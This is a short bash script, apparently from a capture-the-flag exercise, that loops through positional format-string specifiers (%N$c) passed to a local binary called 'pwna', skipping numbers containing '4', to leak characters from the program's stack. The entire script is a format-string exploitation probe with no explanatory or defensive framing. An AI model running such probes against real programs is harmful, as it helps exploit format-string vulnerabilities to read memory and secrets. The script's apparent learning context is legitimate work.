#!/bin/bash

i=1
while [ $i -lt 512 ]
do
	# do strchr equivalent
	if [[ $i == *"4"* ]]
	then
		i=$(( $i + 1 )) # skip because we don't want a '4' to be present in the payload
		continue
	fi

	# program
	echo -n "[*] Trying number $i --> Output: '"
	./pwna %$i\$c
	echo "'"
	i=$(( $i + 1 ))
done
echo "Looks like you were unlucky my friend, try again :("
